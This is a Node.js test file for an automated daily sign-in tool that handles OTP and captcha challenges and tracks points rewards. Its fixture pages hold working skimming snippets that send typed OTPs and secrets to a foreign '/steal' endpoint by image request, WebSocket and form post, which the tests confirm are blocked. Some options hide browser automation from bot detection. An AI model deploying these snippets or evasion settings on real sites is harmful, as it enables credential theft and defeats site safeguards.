import test from 'node:test';
import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import { mkdtemp, stat } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { runSignin, resumeSignin } from '../scripts/lib/engine.mjs';
import { StateStore } from '../scripts/lib/state-store.mjs';

function body(request) {
  return new Promise((resolve) => {
    let value = '';
    request.setEncoding('utf8');
    request.on('data', (chunk) => { value += chunk; });
    request.on('end', () => resolve(new URLSearchParams(value)));
  });
}

async function startFixture() {
  const server = createServer(async (request, response) => {
    const cookies = request.headers.cookie ?? '';
    if (request.method === 'POST' && request.url === '/login') {
      const form = await body(request);
      if (form.get('username') !== 'demo-user' || form.get('password') !== 'demo-pass') {
        response.writeHead(401).end('bad credentials');
        return;
      }
      response.writeHead(302, { location: '/otp', 'set-cookie': 'preauth=1; Path=/; HttpOnly' }).end();
      return;
    }
    if (request.method === 'POST' && request.url === '/otp') {
      const form = await body(request);
      if (!cookies.includes('preauth=1') || form.get('code') !== '246810') {
        response.writeHead(401).end('bad code');
        return;
      }
      response.writeHead(302, { location: '/account', 'set-cookie': 'auth=1; Path=/; HttpOnly' }).end();
      return;
    }
    if (request.method === 'POST' && request.url === '/signin') {
      if (!cookies.includes('auth=1')) {
        response.writeHead(302, { location: '/login' }).end();
        return;
      }
      response.writeHead(302, { location: '/account', 'set-cookie': 'signed=1; Path=/; HttpOnly' }).end();
      return;
    }
    if (request.url === '/login') {
      response.setHeader('content-type', 'text/html; charset=utf-8');
      response.end('<script>sessionStorage.setItem("flow", "active")</script><form method="post"><label>User<input name="username"></label><label>Password<input name="password" type="password"></label><button>Log in</button></form>');
      return;
    }
    if (request.url === '/otp') {
      response.setHeader('content-type', 'text/html; charset=utf-8');
      response.end('<h1>Verification</h1><script>if(sessionStorage.getItem("flow")!=="active")document.body.innerHTML="Expired flow"</script><form method="post"><label>Code<input name="code"></label><button>Verify</button></form>');
      return;
    }
    if (request.url === '/account') {
      if (!cookies.includes('auth=1')) {
        response.writeHead(302, { location: '/login' }).end();
        return;
      }
      response.setHeader('content-type', 'text/html; charset=utf-8');
      if (cookies.includes('signed=1')) {
        response.end('<div id="account">Account</div><p id="status">Already signed today</p>');
      } else {
        response.end('<div id="account">Account</div><form method="post" action="/signin"><button><img src="/daily.png" alt=""></button></form>');
      }
      return;
    }
    if (request.url === '/daily.png') {
      response.writeHead(200, { 'content-type': 'image/png' }).end(Buffer.from('89504e470d0a1a0a', 'hex'));
      return;
    }
    response.writeHead(404).end('not found');
  });
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const address = server.address();
  return {
    origin: `http://127.0.0.1:${address.port}`,
    close: () => new Promise((resolve) => server.close(resolve))
  };
}

function platform(origin) {
  return {
    schemaVersion: 1,
    id: 'headless-demo',
    name: 'Headless demo',
    startUrl: `${origin}/account`,
    allowedOrigins: [origin],
    session: {
      validWhen: [{ kind: 'visible', locator: [{ by: 'css', value: '#account' }] }],
      invalidWhen: [{ kind: 'url', matches: '/login', match: 'includes' }]
    },
    login: {
      fields: [
        { env: 'DEMO_USER', locator: [{ by: 'css', value: 'input[name="username"]' }] },
        { env: 'DEMO_PASS', locator: [{ by: 'css', value: 'input[name="password"]' }] }
      ],
      submit: [{ by: 'role', role: 'button', name: 'Log in' }],
      challenges: [{
        id: 'otp',
        type: 'otp',
        prompt: 'Provide the one-time verification code.',
        when: [{ kind: 'url', matches: '/otp', match: 'includes' }],
        input: [{ by: 'css', value: 'input[name="code"]' }],
        submit: [{ by: 'role', role: 'button', name: 'Verify' }],
        resume: { mode: 'reload' },
        captureScreenshot: true,
        ttlSeconds: 120
      }]
    },
    signin: {
      action: [{ by: 'image', srcIncludes: 'daily.png' }],
      successWhen: [{ kind: 'text', matches: 'Already signed today', match: 'equals', locator: [{ by: 'css', value: '#status' }] }],
      alreadyWhen: [{ kind: 'text', matches: 'Already signed today', match: 'equals', locator: [{ by: 'css', value: '#status' }] }]
    }
  };
}

test('recovers an expired session through OTP and persists the headless session', async () => {
  const fixture = await startFixture();
  const root = await mkdtemp(join(tmpdir(), 'auto-signin-engine-'));
  const store = new StateStore(root);
  try {
    const first = await runSignin(platform(fixture.origin), {
      store,
      env: { DEMO_USER: 'demo-user', DEMO_PASS: 'demo-pass' }
    });
    assert.equal(first.status, 'needs_input', JSON.stringify(first));
    assert.equal(first.challenge.type, 'otp');
    assert.match(first.runId, /^[a-f0-9-]+$/);
    assert.equal(first.headless, true);
    assert.ok(first.challenge.screenshotPath);

    const resumed = await resumeSignin(platform(fixture.origin), first.runId, '246810', { store });
    assert.equal(resumed.status, 'success');
    assert.equal(resumed.evidence, 'Already signed today');
    await assert.rejects(stat(first.challenge.screenshotPath), /ENOENT/);

    const repeated = await runSignin(platform(fixture.origin), { store, env: {} });
    assert.equal(repeated.status, 'already_done');
  } finally {
    await fixture.close();
  }
});

test('waits for delayed session evidence before classifying the page', async () => {
  const server = createServer((request, response) => {
    response.setHeader('content-type', 'text/html; charset=utf-8');
    response.end(`
      <main id="root"></main>
      <script>
        setTimeout(() => {
          document.querySelector('#root').innerHTML = '<div id="account">Account</div><p id="status">Already signed today</p>';
        }, 1200);
      </script>
    `);
  });
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const origin = `http://127.0.0.1:${server.address().port}`;
  const root = await mkdtemp(join(tmpdir(), 'auto-signin-delayed-session-'));
  const adapter = platform(origin);

  try {
    const result = await runSignin(adapter, { store: new StateStore(root) });
    assert.equal(result.status, 'already_done', JSON.stringify(result));
    assert.equal(result.evidence, 'Already signed today');
  } finally {
    await new Promise((resolve) => server.close(resolve));
  }
});

test('does not save a wrong challenge answer or claim success', async () => {
  const fixture = await startFixture();
  const root = await mkdtemp(join(tmpdir(), 'auto-signin-engine-'));
  const store = new StateStore(root);
  try {
    const first = await runSignin(platform(fixture.origin), {
      store,
      env: { DEMO_USER: 'demo-user', DEMO_PASS: 'demo-pass' }
    });
    assert.equal(first.status, 'needs_input', JSON.stringify(first));
    const resumed = await resumeSignin(platform(fixture.origin), first.runId, 'wrong', { store });
    assert.equal(resumed.status, 'failed');
    assert.equal(await store.loadSession('headless-demo'), null);
  } finally {
    await fixture.close();
  }
});

test('blocks a cross-origin login form before credentials are transmitted', async () => {
  let receivedByForeignOrigin = 0;
  const foreign = createServer((request, response) => {
    receivedByForeignOrigin += 1;
    response.end('unexpected');
  });
  await new Promise((resolve) => foreign.listen(0, '127.0.0.1', resolve));
  const foreignOrigin = `http://127.0.0.1:${foreign.address().port}`;

  const source = createServer((request, response) => {
    if (request.url === '/account') {
      response.writeHead(302, { location: '/login' }).end();
      return;
    }
    response.setHeader('content-type', 'text/html; charset=utf-8');
    response.end(`<form method="post" action="${foreignOrigin}/steal"><input name="username"><input name="password" type="password"><button>Log in</button></form>`);
  });
  await new Promise((resolve) => source.listen(0, '127.0.0.1', resolve));
  const sourceOrigin = `http://127.0.0.1:${source.address().port}`;
  const root = await mkdtemp(join(tmpdir(), 'auto-signin-origin-'));

  const adapter = platform(sourceOrigin);
  adapter.login.fields = [
    { env: 'DEMO_USER', locator: [{ by: 'css', value: 'input[name="username"]' }] },
    { env: 'DEMO_PASS', locator: [{ by: 'css', value: 'input[name="password"]' }] }
  ];
  try {
    const result = await runSignin(adapter, {
      store: new StateStore(root),
      env: { DEMO_USER: 'demo-user', DEMO_PASS: 'demo-pass' }
    });
    assert.equal(result.status, 'failed');
    assert.match(result.message, /allowed origin/i);
    assert.equal(receivedByForeignOrigin, 0);
  } finally {
    await Promise.all([
      new Promise((resolve) => source.close(resolve)),
      new Promise((resolve) => foreign.close(resolve))
    ]);
  }
});

test('keeps a checkpoint when resume is blocked by another active run', async () => {
  const root = await mkdtemp(join(tmpdir(), 'auto-signin-lock-'));
  const store = new StateStore(root);
  const adapter = platform('https://example.test');
  const checkpoint = await store.saveCheckpoint(adapter.id, {
    currentUrl: 'https://example.test/otp',
    storageState: { cookies: [], origins: [] },
    challengeId: 'otp'
  });
  const release = await store.acquireLock(adapter.id);
  try {
    const result = await resumeSignin(adapter, checkpoint.runId, 'not-submitted', { store });
    assert.equal(result.status, 'failed');
    assert.match(result.message, /already running/);
    assert.equal((await store.loadCheckpoint(checkpoint.runId)).runId, checkpoint.runId);
  } finally {
    await release();
  }
});

test('does not start a second login while a platform challenge is pending', async () => {
  const root = await mkdtemp(join(tmpdir(), 'auto-signin-pending-'));
  const store = new StateStore(root);
  const adapter = platform('https://example.test');
  await store.saveCheckpoint(adapter.id, {
    currentUrl: 'https://example.test/otp',
    storageState: { cookies: [], origins: [] },
    sessionStorage: { origin: 'https://example.test', entries: [] },
    challengeId: 'otp'
  });
  const browserType = { launch: async () => { throw new Error('browser must not launch'); } };

  const result = await runSignin(adapter, { store, browserType, env: {} });

  assert.equal(result.code, 'challenge_pending');
});

test('requires success evidence to transition after the sign-in action', async () => {
  const server = createServer((request, response) => {
    response.setHeader('content-type', 'text/html; charset=utf-8');
    response.end('<div id="account">Account</div><p id="status">Signed today</p><button id="sign">Sign</button>');
  });
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const origin = `http://127.0.0.1:${server.address().port}`;
  const root = await mkdtemp(join(tmpdir(), 'auto-signin-evidence-'));
  const adapter = platform(origin);
  adapter.login = undefined;
  adapter.signin.action = [{ by: 'css', value: '#sign' }];
  adapter.signin.alreadyWhen = [];
  adapter.signin.successWhen = [{ kind: 'text', matches: 'Signed today', match: 'equals', locator: [{ by: 'css', value: '#status' }] }];
  try {
    const result = await runSignin(adapter, { store: new StateStore(root), env: {} });
    assert.equal(result.code, 'success_not_verified');
  } finally {
    await new Promise((resolve) => server.close(resolve));
  }
});

test('waits for delayed positive success evidence within the configured timeout', async () => {
  const server = createServer((request, response) => {
    response.setHeader('content-type', 'text/html; charset=utf-8');
    response.end(`
      <div id="account">Account</div>
      <button id="sign" onclick="setTimeout(() => {
        const status = document.createElement('p');
        status.id = 'status';
        status.textContent = 'Signed today';
        document.body.append(status);
      }, 1500)">Sign</button>
    `);
  });
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const origin = `http://127.0.0.1:${server.address().port}`;
  const root = await mkdtemp(join(tmpdir(), 'auto-signin-delayed-evidence-'));
  const adapter = platform(origin);
  adapter.login = undefined;
  adapter.signin.action = [{ by: 'css', value: '#sign' }];
  adapter.signin.alreadyWhen = [];
  adapter.signin.successTimeoutSeconds = 3;
  adapter.signin.successWhen = [{ kind: 'text', matches: 'Signed today', match: 'equals', locator: [{ by: 'css', value: '#status' }] }];
  try {
    const result = await runSignin(adapter, { store: new StateStore(root), env: {} });
    assert.equal(result.status, 'success', JSON.stringify(result));
    assert.equal(result.evidence, 'Signed today');
  } finally {
    await new Promise((resolve) => server.close(resolve));
  }
});

test('captures structured reward evidence before closing the browser', async () => {
  const server = createServer((request, response) => {
    response.setHeader('content-type', 'text/html; charset=utf-8');
    response.end(`
      <div id="account">Account</div>
      <button id="sign" onclick="setTimeout(() => {
        document.body.insertAdjacentHTML('beforeend', '<p id=status>Signed today</p><p id=reward>获得积分+1</p>');
      }, 100)">Sign</button>
    `);
  });
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const origin = `http://127.0.0.1:${server.address().port}`;
  const root = await mkdtemp(join(tmpdir(), 'auto-signin-reward-'));
  const adapter = platform(origin);
  adapter.login = undefined;
  adapter.signin.action = [{ by: 'css', value: '#sign' }];
  adapter.signin.alreadyWhen = [];
  adapter.signin.successWhen = [{ kind: 'text', matches: 'Signed today', match: 'equals', locator: [{ by: 'css', value: '#status' }] }];
  adapter.signin.rewards = [{
    id: 'daily',
    type: 'points',
    unit: '积分',
    sources: [{
      id: 'success-message',
      locator: [{ by: 'css', value: '#reward' }],
      pattern: '获得积分\\+(\\d+)',
      amountGroup: 1
    }]
  }];

  try {
    const result = await runSignin(adapter, { store: new StateStore(root), env: {} });
    assert.equal(result.status, 'success', JSON.stringify(result));
    assert.deepEqual(result.rewards, [{
      type: 'points',
      amount: 1,
      unit: '积分',
      source: 'success-message',
      confidence: 'explicit',
      evidence: '获得积分+1'
    }]);
  } finally {
    await new Promise((resolve) => server.close(resolve));
  }
});

test('reports actual headed metadata and strips credential variables from browser env', async () => {
  const root = await mkdtemp(join(tmpdir(), 'auto-signin-browser-env-'));
  let launchOptions;
  const browserType = {
    launch: async (value) => {
      launchOptions = value;
      throw new Error('synthetic launch failure');
    }
  };
  const result = await runSignin(platform('https://example.test'), {
    store: new StateStore(root),
    browserType,
    headless: false,
    browserEnvSource: { PATH: '/bin', DEMO_PASS: 'secret', API_TOKEN: 'secret' }
  });

  assert.equal(result.headless, false);
  assert.deepEqual(launchOptions.env, { PATH: '/bin' });
});

test('does not exfiltrate a challenge answer to an off-origin subresource during resume', async () => {
  const stolen = [];
  const foreign = createServer((request, response) => {
    stolen.push(request.url);
    response.end('ok');
  });
  await new Promise((resolve) => foreign.listen(0, '127.0.0.1', resolve));
  const foreignOrigin = `http://127.0.0.1:${foreign.address().port}`;

  const source = createServer((request, response) => {
    response.setHeader('content-type', 'text/html; charset=utf-8');
    response.end(`<input id="code"><script>document.querySelector('#code').addEventListener('input', e => { new Image().src = '${foreignOrigin}/steal?otp=' + encodeURIComponent(e.target.value); })</script>`);
  });
  await new Promise((resolve) => source.listen(0, '127.0.0.1', resolve));
  const origin = `http://127.0.0.1:${source.address().port}`;
  const root = await mkdtemp(join(tmpdir(), 'auto-signin-resume-leak-'));
  const store = new StateStore(root);

  const adapter = platform(origin);
  adapter.login.challenges = [{
    id: 'otp',
    type: 'otp',
    prompt: 'code',
    when: [{ kind: 'visible', locator: [{ by: 'css', value: '#code' }] }],
    input: [{ by: 'css', value: '#code' }],
    submit: [{ by: 'css', value: '#code' }],
    resume: { mode: 'reload' }
  }];
  const checkpoint = await store.saveCheckpoint(adapter.id, {
    currentUrl: `${origin}/otp`,
    storageState: { cookies: [], origins: [] },
    sessionStorage: { origin, entries: [] },
    challengeId: 'otp'
  });

  try {
    const result = await resumeSignin(adapter, checkpoint.runId, 'otp-secret', { store });
    assert.equal(result.status, 'failed');
    assert.deepEqual(stolen, []);
  } finally {
    await Promise.all([
      new Promise((resolve) => source.close(resolve)),
      new Promise((resolve) => foreign.close(resolve))
    ]);
  }
});

test('does not exfiltrate credentials over an off-origin WebSocket', async () => {
  const upgrades = [];
  const foreign = createServer();
  foreign.on('upgrade', (request, socket) => { upgrades.push(request.url); socket.end(); });
  await new Promise((resolve) => foreign.listen(0, '127.0.0.1', resolve));
  const wsOrigin = `ws://127.0.0.1:${foreign.address().port}`;

  const source = createServer((request, response) => {
    response.setHeader('content-type', 'text/html; charset=utf-8');
    if (request.url === '/account') {
      response.writeHead(302, { location: '/login' }).end();
      return;
    }
    response.end(`<input id="user"><button id="submit">go</button><script>document.querySelector('#user').addEventListener('input', e => { new WebSocket('${wsOrigin}/steal?secret=' + encodeURIComponent(e.target.value)); })</script>`);
  });
  await new Promise((resolve) => source.listen(0, '127.0.0.1', resolve));
  const origin = `http://127.0.0.1:${source.address().port}`;
  const root = await mkdtemp(join(tmpdir(), 'auto-signin-ws-leak-'));

  const adapter = platform(origin);
  adapter.login.fields = [{ env: 'USER_SECRET', locator: [{ by: 'css', value: '#user' }] }];
  adapter.login.submit = [{ by: 'css', value: '#submit' }];

  try {
    const result = await runSignin(adapter, {
      store: new StateStore(root),
      env: { USER_SECRET: 'configured-secret' }
    });
    assert.equal(result.status, 'failed');
    assert.deepEqual(upgrades, []);
  } finally {
    await Promise.all([
      new Promise((resolve) => source.close(resolve)),
      new Promise((resolve) => foreign.close(resolve))
    ]);
  }
});

function startCaptchaFixture({ populateWhenNotAutomated = true, failFirstAttempt = false, delayedSignin = false, requireRemember = false } = {}) {
  const userAgents = [];
  let loginLoads = 0;
  const server = createServer(async (request, response) => {
    userAgents.push(request.headers['user-agent'] ?? '');
    const cookies = request.headers.cookie ?? '';
    const html = (content) => {
      response.setHeader('content-type', 'text/html; charset=utf-8');
      response.end(content);
    };
    if (request.method === 'POST' && request.url === '/login') {
      if (requireRemember && (await body(request)).get('remember_me') !== 'week') {
        response.writeHead(400).end('Remember checkbox was lost after reload');
        return;
      }
      response.writeHead(302, { location: '/account', 'set-cookie': 'auth=1; Path=/; HttpOnly' }).end();
      return;
    }
    if (request.url === '/login') {
      loginLoads += 1;
      const failed = failFirstAttempt && loginLoads === 1;
      const script = populateWhenNotAutomated && !failed
        ? '<script>if(!navigator.webdriver){setTimeout(()=>{const c=document.querySelector(\'input[name="cap-token"]\');if(c)c.value=\'CAPTCHA_SOLVED_1234567890\';},50);}</script>'
        : '';
      const failure = failed ? '<p id="captcha-failed">Verification failed, retry</p>' : '';
      html(`<form method="post" action="/login"><input name="email"><input name="password" type="password"><input id="remember_me" name="remember_me" type="checkbox" value="week"><input name="cap-token" type="hidden"><button type="submit">Log in</button></form>${failure}${script}`);
      return;
    }
    if (request.url === '/account') {
      if (!cookies.includes('auth=1')) { response.writeHead(302, { location: '/login' }).end(); return; }
      if (delayedSignin) {
        html(`<div id="account">Account</div><p id="status">Not signed</p><button id="sign">Sign in</button><script>setTimeout(() => document.querySelector('#sign').addEventListener('click', () => { document.querySelector('#status').textContent = 'Signed today'; }), 1500)</script>`);
      } else {
        html('<div id="account">Account</div><p id="status">Already signed today</p>');
      }
      return;
    }
    response.writeHead(404).end('not found');
  });
  return new Promise((resolve) => server.listen(0, '127.0.0.1', () => resolve({
    origin: `http://127.0.0.1:${server.address().port}`,
    userAgents,
    get loginLoads() { return loginLoads; },
    close: () => new Promise((r) => server.close(r))
  })));
}

function captchaAdapter(origin, browser) {
  return {
    schemaVersion: 1,
    id: 'captcha-demo',
    name: 'Captcha demo',
    startUrl: `${origin}/account`,
    allowedOrigins: [origin],
    ...(browser ? { browser } : {}),
    session: {
      validWhen: [{ kind: 'visible', locator: [{ by: 'css', value: '#account' }] }],
      invalidWhen: [{ kind: 'url', matches: '/login', match: 'includes' }]
    },
    login: {
      fields: [
        { env: 'DEMO_USER', locator: [{ by: 'css', value: 'input[name="email"]' }] },
        { env: 'DEMO_PASS', locator: [{ by: 'css', value: 'input[name="password"]' }] }
      ],
      captcha: {
        readyWhen: [{ kind: 'value', locator: [{ by: 'css', value: 'input[name="cap-token"]' }], minLength: 10 }],
        timeoutSeconds: 5,
        captureScreenshot: true
      },
      submit: [{ by: 'css', value: 'button[type="submit"]' }]
    },
    signin: {
      action: [{ by: 'css', value: '#sign' }],
      successWhen: [{ kind: 'text', matches: 'Already signed today', match: 'equals', locator: [{ by: 'css', value: '#status' }] }],
      alreadyWhen: [{ kind: 'text', matches: 'Already signed today', match: 'equals', locator: [{ by: 'css', value: '#status' }] }]
    }
  };
}

test('waits for a captcha to become ready before submitting login and applies browser config', async () => {
  const fixture = await startCaptchaFixture();
  const root = await mkdtemp(join(tmpdir(), 'auto-signin-captcha-'));
  const store = new StateStore(root);
  const adapter = captchaAdapter(fixture.origin, {
    hideAutomation: true,
    userAgent: 'CustomUA/9.9',
    launchArgs: ['--disable-dev-shm-usage']
  });
  try {
    const result = await runSignin(adapter, { store, env: { DEMO_USER: 'u', DEMO_PASS: 'p' } });
    assert.equal(result.status, 'already_done', JSON.stringify(result));
    assert.ok(fixture.userAgents.includes('CustomUA/9.9'), 'custom user agent was not sent');
  } finally {
    await fixture.close();
  }
});

test('fails closed when a captcha never becomes ready', async () => {
  const fixture = await startCaptchaFixture({ populateWhenNotAutomated: false });
  const root = await mkdtemp(join(tmpdir(), 'auto-signin-captcha-'));
  const store = new StateStore(root);
  const adapter = captchaAdapter(fixture.origin, undefined);
  try {
    const result = await runSignin(adapter, { store, env: { DEMO_USER: 'u', DEMO_PASS: 'p' } });
    assert.equal(result.status, 'failed');
    assert.equal(result.code, 'captcha_unsolved');
    assert.match(result.message, /Captcha did not become ready/);
    assert.ok(result.message.includes('Screenshot:'));
  } finally {
    await fixture.close();
  }
});

test('reloads and retries when a captcha reports an explicit failure', async () => {
  const fixture = await startCaptchaFixture({ failFirstAttempt: true });
  const root = await mkdtemp(join(tmpdir(), 'auto-signin-captcha-retry-'));
  const adapter = captchaAdapter(fixture.origin, { hideAutomation: true });
  adapter.login.captcha.failureWhen = [{ kind: 'text', matches: 'Verification failed', match: 'includes' }];
  adapter.login.captcha.maxAttempts = 2;
  try {
    const result = await runSignin(adapter, {
      store: new StateStore(root),
      env: { DEMO_USER: 'u', DEMO_PASS: 'p' }
    });
    assert.equal(result.status, 'already_done', JSON.stringify(result));
    assert.equal(fixture.loginLoads, 2);
  } finally {
    await fixture.close();
  }
});

test('captcha reload preserves required remember-me checks without replaying navigation', async () => {
  const fixture = await startCaptchaFixture({ failFirstAttempt: true, requireRemember: true });
  const adapter = captchaAdapter(fixture.origin, { hideAutomation: true });
  adapter.login.prepare = [{action: 'check', locator: [{by: 'css', value: '#remember_me'}]}];
  adapter.login.captcha.failureWhen = [{kind: 'text', matches: 'Verification failed', match: 'includes'}];
  adapter.login.captcha.maxAttempts = 2;
  try {
    const result = await runSignin(adapter, {store: new StateStore(await mkdtemp(join(tmpdir(), 'signin-remember-reload-'))), env: {DEMO_USER: 'fixture', DEMO_PASS: 'fixture-password'}});
    assert.equal(result.status, 'already_done', JSON.stringify(result));
    assert.equal(fixture.loginLoads, 2);
  } finally { await fixture.close(); }
});

test('waits for the configured action delay after login before signing in', async () => {
  const fixture = await startCaptchaFixture({ delayedSignin: true });
  const root = await mkdtemp(join(tmpdir(), 'auto-signin-post-login-delay-'));
  const adapter = captchaAdapter(fixture.origin, { hideAutomation: true });
  adapter.signin.successWhen = [{ kind: 'text', matches: 'Signed today', match: 'equals', locator: [{ by: 'css', value: '#status' }] }];
  adapter.signin.alreadyWhen = [{ kind: 'text', matches: 'Already signed today', match: 'equals', locator: [{ by: 'css', value: '#status' }] }];
  adapter.signin.actionDelaySeconds = 2;
  try {
    const result = await runSignin(adapter, {
      store: new StateStore(root),
      env: { DEMO_USER: 'u', DEMO_PASS: 'p' }
    });
    assert.equal(result.status, 'success', JSON.stringify(result));
  } finally {
    await fixture.close();
  }
});

function startInlineFixture() {
  const server = createServer(async (request, response) => {
    const cookies = request.headers.cookie ?? '';
    const html = (content) => {
      response.setHeader('content-type', 'text/html; charset=utf-8');
      response.end(content);
    };
    if (request.method === 'POST' && request.url === '/login') {
      response.writeHead(302, { location: '/2fa', 'set-cookie': 'preauth=1; Path=/; HttpOnly' }).end();
      return;
    }
    if (request.method === 'POST' && request.url === '/2fa') {
      const form = await body(request);
      if (!cookies.includes('preauth=1') || form.get('code') !== '246810') {
        response.writeHead(401).end('bad code');
        return;
      }
      response.writeHead(302, { location: '/account', 'set-cookie': 'auth=1; Path=/; HttpOnly' }).end();
      return;
    }
    if (request.url === '/login') {
      html('<form method="post" action="/login"><input name="email"><input name="password" type="password"><button type="submit">Log in</button></form>');
      return;
    }
    if (request.url === '/2fa') {
      html('<form method="post" action="/2fa"><input name="code"><button type="submit">Verify</button></form>');
      return;
    }
    if (request.url === '/account') {
      if (!cookies.includes('auth=1')) { response.writeHead(302, { location: '/login' }).end(); return; }
      html('<div id="account">Account</div><p id="status">Already signed today</p>');
      return;
    }
    response.writeHead(404).end('not found');
  });
  return new Promise((resolve) => server.listen(0, '127.0.0.1', () => resolve({
    origin: `http://127.0.0.1:${server.address().port}`,
    close: () => new Promise((r) => server.close(r))
  })));
}

function inlineAdapter(origin) {
  return {
    schemaVersion: 1,
    id: 'inline-demo',
    name: 'Inline demo',
    startUrl: `${origin}/account`,
    allowedOrigins: [origin],
    session: {
      validWhen: [{ kind: 'visible', locator: [{ by: 'css', value: '#account' }] }],
      invalidWhen: [{ kind: 'url', matches: '/login', match: 'includes' }]
    },
    login: {
      fields: [
        { env: 'DEMO_USER', locator: [{ by: 'css', value: 'input[name="email"]' }] },
        { env: 'DEMO_PASS', locator: [{ by: 'css', value: 'input[name="password"]' }] }
      ],
      submit: [{ by: 'css', value: 'button[type="submit"]' }],
      challenges: [{
        id: 'twofa',
        type: 'otp',
        prompt: 'Enter the emailed verification code.',
        when: [{ kind: 'url', matches: '/2fa', match: 'includes' }],
        input: [{ by: 'css', value: 'input[name="code"]' }],
        submit: [{ by: 'css', value: 'button[type="submit"]' }],
        resume: { mode: 'inline' }
      }]
    },
    signin: {
      action: [{ by: 'css', value: '#sign' }],
      successWhen: [{ kind: 'text', matches: 'Already signed today', match: 'equals', locator: [{ by: 'css', value: '#status' }] }],
      alreadyWhen: [{ kind: 'text', matches: 'Already signed today', match: 'equals', locator: [{ by: 'css', value: '#status' }] }]
    }
  };
}

test('relays an inline challenge answer and completes login in the same browser', async () => {
  const fixture = await startInlineFixture();
  const root = await mkdtemp(join(tmpdir(), 'auto-signin-inline-'));
  const store = new StateStore(root);
  const prompts = [];
  try {
    const result = await runSignin(inlineAdapter(fixture.origin), {
      store,
      env: { DEMO_USER: 'u', DEMO_PASS: 'p' },
      notify: (message) => prompts.push(message),
      readAnswer: async () => '246810'
    });
    assert.equal(result.status, 'already_done', JSON.stringify(result));
    assert.equal(prompts.length, 1);
    assert.match(prompts[0], /verification code/i);
  } finally {
    await fixture.close();
  }
});

test('rejects an inline challenge when the answer is not accepted', async () => {
  const fixture = await startInlineFixture();
  const root = await mkdtemp(join(tmpdir(), 'auto-signin-inline-'));
  const store = new StateStore(root);
  try {
    const result = await runSignin(inlineAdapter(fixture.origin), {
      store,
      env: { DEMO_USER: 'u', DEMO_PASS: 'p' },
      readAnswer: async () => 'wrong'
    });
    assert.equal(result.status, 'failed');
    assert.equal(result.code, 'challenge_rejected');
    assert.equal(await store.loadSession('inline-demo'), null);
  } finally {
    await fixture.close();
  }
});

test('scheduled inline OTP reports needs_input without reading stdin or persisting a reusable challenge', async () => {
  const fixture = await startInlineFixture();
  const root = await mkdtemp(join(tmpdir(), 'auto-signin-inline-scheduled-'));
  const store = new StateStore(root);
  try {
    const result = await runSignin(inlineAdapter(fixture.origin), {
      store, executablePath: '/usr/bin/chromium', interactive: false,
      env: { DEMO_USER: 'u', DEMO_PASS: 'p' },
      readAnswer: async () => { throw new Error('must not read stdin'); }
    });
    assert.equal(result.status, 'needs_input', JSON.stringify(result));
    assert.equal(result.code, 'interactive_login_required');
    assert.equal(result.runId, undefined);
    assert.equal(await store.loadSession('inline-demo'), null);
  } finally { await fixture.close(); }
});
